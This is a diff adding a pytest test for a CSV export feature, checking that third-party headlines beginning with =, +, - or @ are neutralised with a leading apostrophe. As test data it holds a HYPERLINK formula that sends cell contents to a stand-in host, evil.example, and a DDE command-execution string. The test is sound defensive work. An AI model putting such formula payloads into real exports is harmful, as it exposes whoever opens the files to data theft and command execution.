@@ -8,6 +8,7 @@ import os
 import pathlib
 import re
 
+import pyarrow as pa
 import pyarrow.csv as pacsv
 import pyarrow.parquet as pq
 import pytest
@@ -530,3 +531,47 @@ def test_query_answers_intervals_and_nanosecond_timestamps(setup):
     assert ns.rows == [{"ns": "2026-01-01T00:00:00.123456"}]
     assert any("ns are cut to microseconds" in n for n in ns.notes)
     assert isinstance(call(ctx, "results_query", sql=ns_sql, store=True), ResultMarker)
+
+
+def test_csv_export_neutralises_third_party_formulas(setup):
+    """A headline starting with = (or +, -, @) was written as is, so a
+    spreadsheet opening the export ran it as a formula; third-party text now
+    gets a leading ', with a note. Other results and Parquet are unchanged."""
+    ctx, store, _, _, _, tmp_path = setup
+    headlines = [
+        '=HYPERLINK("https://evil.example/?d="&A2,"Fed statement")',
+        "+cmd|' /C calc'!A0",
+        "Plain",
+        None,
+    ]
+    rows = [
+        r.model_copy(update={"headline": h or "x", "summary": h})
+        for r, h in zip(news_rows(4), headlines, strict=True)
+    ]
+    news = store.put(
+        rows_to_table(rows, NewsItem),
+        tool="news_search",
+        model=NewsItem.schema_name,
+        provenance=provenance(),
+        risk="external_text",
+    )
+    out = call(ctx, "results_export", result_id=news.result_id, format="csv", file_name="news")
+    written = pacsv.read_csv(tmp_path / "out" / "news.csv").to_pydict()
+    assert written["headline"][:3] == ["'" + headlines[0], "'" + headlines[1], "Plain"]
+    assert written["summary"][:3] == ["'" + headlines[0], "'" + headlines[1], "Plain"]
+    assert any(n.startswith("4 third-party text cell(s) began with =, +, -, @") for n in out.notes)
+    call(ctx, "results_export", result_id=news.result_id, format="parquet", file_name="news")
+    assert (
+        pq.read_table(tmp_path / "out" / "news.parquet").column("headline").to_pylist()[:2] == headlines[:2]
+    )
+    plain = store.put(
+        pa.table({"s": ["-1.5", "=x"]}),
+        tool="results_query",
+        model="marketlens.QueryRow",
+        provenance=provenance(),
+    )
+    out = call(ctx, "results_export", result_id=plain.result_id, format="csv", file_name="plain")
+    assert pacsv.read_csv(
+        tmp_path / "out" / "plain.csv", convert_options=pacsv.ConvertOptions(column_types={"s": pa.string()})
+    ).column("s").to_pylist() == ["-1.5", "=x"]
+    assert out.notes == []
